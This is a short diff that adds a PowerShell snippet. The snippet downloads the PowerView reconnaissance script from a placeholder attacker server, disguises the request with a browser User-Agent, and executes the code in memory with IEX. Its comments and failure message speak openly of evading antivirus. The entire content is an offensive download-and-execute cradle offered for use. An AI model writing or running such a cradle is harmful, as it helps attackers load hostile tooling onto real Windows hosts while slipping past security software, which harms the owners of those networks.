@@ -1,0 +1,17 @@
+# 1. Clear any old failed variables
+$data = $null
+
+# 2. Try the download again with a different 'User-Agent' 
+# (This makes the request look like a normal web browser instead of a script)
+$url = "http://<Your-Server-IP>/powerview.ps1"
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+
+try {
+    $data = $wc.DownloadData($url)
+    $script = [System.Text.Encoding]::UTF8.GetString($data)
+    IEX $script
+    Write-Host "Success: PowerView loaded." -ForegroundColor Green
+} catch {
+    Write-Host "Download Failed: The antivirus likely blocked the connection." -ForegroundColor Red
+}
